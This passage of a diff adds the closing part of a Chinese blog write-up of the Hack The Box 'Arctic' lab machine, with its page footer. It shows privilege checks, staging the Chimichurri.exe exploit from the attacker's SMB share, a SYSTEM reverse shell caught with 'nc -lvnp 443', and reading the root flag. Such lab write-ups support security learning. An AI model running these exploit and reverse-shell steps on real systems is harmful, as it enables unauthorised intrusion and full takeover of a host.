Connection Name: Local Area Connection<br>                                 DHCP Enabled:    No<br>                                 IP <span class="hljs-title function_">address</span><span class="hljs-params">(es)</span><br>                                 [01]: 10.10.10.11<br><br>C:\ColdFusion8\runtime\bin&gt;<br></code></pre></td></tr></table></figure>
+
+<p>16、查看下用户信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\ColdFusion8\runtime\bin&gt;whoami /priv<br>whoami /priv<br><br>PRIVILEGES INFORMATION<br>----------------------<br><br>Privilege Name                Description                               State   <br>============================= ========================================= ========<br>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled <br>SeImpersonatePrivilege        Impersonate a client after authentication Enabled <br>SeCreateGlobalPrivilege       Create global objects                     Enabled <br>SeIncreaseWorkingSetPrivilege Increase a process working <span class="hljs-built_in">set</span>            Disabled<br><br>C:\ColdFusion8\runtime\bin&gt;<br></code></pre></td></tr></table></figure>
+
+<p>17、这里使用了一个通用的枚举工具进行了枚举，但是由于我本机的原因，安装库方面的问题，无法使用这个工具</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop/tools/Windows-Exploit-Suggester]<br>└─$ python2 windows-exploit-suggester.py --update<br>[*] initiating winsploit version <span class="hljs-number">3.3</span>...<br>[+] writing to file <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-08</span>-mssb.xls<br>[*] done<br><br><br>┌──(kali㉿offsec)-[~/Desktop/tools/Windows-Exploit-Suggester]<br>└─$ python2 windows-exploit-suggester.py --database <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-08</span>-mssb.xls --systeminfo sysinfo-htb-Arctic <br>[*] initiating winsploit version <span class="hljs-number">3.3</span>...<br>[*] database file detected as xls or xlsx based on extension<br>[-] please install and upgrade the python-xlrd library<br></code></pre></td></tr></table></figure>
+
+<p>18、然后参照演练报告知道了，这里是需要使用Chimichurri.exe这个漏洞利用工具的，传递漏洞利用工具到目标靶机上</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\Users\tolis\Downloads&gt;dir \\<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.2</span>\share<br>dir \\<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.2</span>\share<br> Volume in drive \\<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.2</span>\share has no label.<br> Volume Serial Number is ABCD-EFAA<br><br> Directory of \\<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.2</span>\share<br><br><span class="hljs-number">25</span>/<span class="hljs-number">02</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">04</span>:<span class="hljs-number">16</span> ��         <span class="hljs-number">8.323</span><span class="hljs-number">.072</span> chisel_1<span class="hljs-number">.9</span><span class="hljs-number">.1</span>_linux_arm64<br><span class="hljs-number">02</span>/<span class="hljs-number">02</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">04</span>:<span class="hljs-number">41</span> ��    &lt;DIR&gt;          frp_0<span class="hljs-number">.43</span><span class="hljs-number">.0</span>_linux_amd64<br><span class="hljs-number">02</span>/<span class="hljs-number">02</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">04</span>:<span class="hljs-number">42</span> ��    &lt;DIR&gt;          frp_0<span class="hljs-number">.43</span><span class="hljs-number">.0</span>_linux_arm64<br><span class="hljs-number">23</span>/<span class="hljs-number">02</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">09</span>:<span class="hljs-number">51</span> ��    &lt;DIR&gt;          htb-portscan<br><span class="hljs-number">12</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2023</span>  <span class="hljs-number">02</span>:<span class="hljs-number">55</span> ��    &lt;DIR&gt;          pspy<br><span class="hljs-number">08</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">11</span>:<span class="hljs-number">15</span> ��    &lt;DIR&gt;          Windows-Exploit-Suggester<br><span class="hljs-number">25</span>/<span class="hljs-number">02</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">04</span>:<span class="hljs-number">14</span> ��         <span class="hljs-number">9.006</span><span class="hljs-number">.080</span> chisel_1<span class="hljs-number">.9</span><span class="hljs-number">.1</span>_windows_amd64<br><span class="hljs-number">13</span>/<span class="hljs-number">05</span>/<span class="hljs-number">2005</span>  <span class="hljs-number">11</span>:<span class="hljs-number">53</span> ��            <span class="hljs-number">68.608</span> nc.exe<br><span class="hljs-number">07</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">57</span> ��            <span class="hljs-number">27.136</span> PrintSpoofer64.exe<br><span class="hljs-number">08</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">11</span>:<span class="hljs-number">23</span> ��            <span class="hljs-number">97.280</span> Chimichurri.exe<br>               <span class="hljs-number">5</span> File(s)     <span class="hljs-number">17.542</span><span class="hljs-number">.656</span> bytes<br>               <span class="hljs-number">5</span> Dir(s)               <span class="hljs-number">0</span> bytes <span class="hljs-built_in">free</span><br><br>C:\Users\tolis\Downloads&gt;copy \\<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.2</span>\share\Chimichurri.exe .<br>copy \\<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.2</span>\share\Chimichurri.exe .<br>        <span class="hljs-number">1</span> file(s) copied.<br><br>C:\Users\tolis\Downloads&gt;dir<br>dir<br> Volume in drive C has no label.<br> Volume Serial Number is <span class="hljs-number">5</span>C03<span class="hljs-number">-76</span>A8<br><br> Directory of C:\Users\tolis\Downloads<br><br><span class="hljs-number">09</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">07</span>:<span class="hljs-number">23</span> ��    &lt;DIR&gt;          .<br><span class="hljs-number">09</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">07</span>:<span class="hljs-number">23</span> ��    &lt;DIR&gt;          ..<br><span class="hljs-number">08</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">11</span>:<span class="hljs-number">23</span> ��            <span class="hljs-number">97.280</span> Chimichurri.exe<br><span class="hljs-number">07</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">57</span> ��            <span class="hljs-number">27.136</span> PrintSpoofer64.exe<br>               <span class="hljs-number">2</span> File(s)        <span class="hljs-number">124.416</span> bytes<br>               <span class="hljs-number">2</span> Dir(s)   <span class="hljs-number">1.433</span><span class="hljs-number">.980</span><span class="hljs-number">.928</span> bytes <span class="hljs-built_in">free</span><br><br>C:\Users\tolis\Downloads&gt;<br></code></pre></td></tr></table></figure>
+
+<p>19、开始利用漏洞并读取最终flag信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\Users\tolis\Downloads&gt;Chimichurri.exe <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.2</span> <span class="hljs-number">443</span><br>Chimichurri.exe <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.2</span> <span class="hljs-number">443</span><br>/Chimichurri/--&gt;This exploit gives you a Local System shell &lt;BR&gt;/Chimichurri/--&gt;Changing registry values...&lt;BR&gt;/Chimichurri/--&gt;Got SYSTEM token...&lt;BR&gt;/Chimichurri/--&gt;Running reverse shell...&lt;BR&gt;/Chimichurri/--&gt;Restoring <span class="hljs-keyword">default</span> registry values...&lt;BR&gt;<br>C:\Users\tolis\Downloads&gt;<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp <span class="hljs-number">443</span><br>listening on [any] <span class="hljs-number">443</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.2</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>] <span class="hljs-number">49556</span><br>Microsoft Windows [Version <span class="hljs-number">6.1</span><span class="hljs-number">.7600</span>]<br>Copyright (c) <span class="hljs-number">2009</span> Microsoft Corporation.  All rights reserved.<br><br>C:\Users\tolis\Downloads&gt;whoami<br>whoami<br>nt authority\system<br><br>C:\Users\tolis\Downloads&gt;type C:/Users/Administrator/Desktop/root.txt<br>type C:/Users/Administrator/Desktop/root.txt<br>The syntax of the command is incorrect.<br><br>C:\Users\tolis\Downloads&gt;cd C:/Users/Administrator/Desktop/<br>cd C:/Users/Administrator/Desktop/<br><br>C:\Users\Administrator\Desktop&gt;dir<br>dir<br> Volume in drive C has no label.<br> Volume Serial Number is <span class="hljs-number">5</span>C03<span class="hljs-number">-76</span>A8<br><br> Directory of C:\Users\Administrator\Desktop<br><br><span class="hljs-number">22</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">09</span>:<span class="hljs-number">02</span> ��    &lt;DIR&gt;          .<br><span class="hljs-number">22</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">09</span>:<span class="hljs-number">02</span> ��    &lt;DIR&gt;          ..<br><span class="hljs-number">09</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">05</span>:<span class="hljs-number">53</span> ��                <span class="hljs-number">34</span> root.txt<br>               <span class="hljs-number">1</span> File(s)             <span class="hljs-number">34</span> bytes<br>               <span class="hljs-number">2</span> Dir(s)   <span class="hljs-number">1.433</span><span class="hljs-number">.980</span><span class="hljs-number">.928</span> bytes <span class="hljs-built_in">free</span><br><br>C:\Users\Administrator\Desktop&gt;type root.txt<br>type root.txt<br><span class="hljs-number">8</span>dcb68724658ed191b667da961c6e2b7<br><br>C:\Users\Administrator\Desktop&gt;<br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/9</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Arctic-htb-writeup</div>
+      <div>https://sh1yan.top/2024/03/08/Arctic-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年3月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/03/14/Active-htb-writeup/" title="Active-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Active-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/23/Buff-htb-writeup/" title="Buff-htb-writeup">
+                        <span class="hidden-mobile">Buff-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
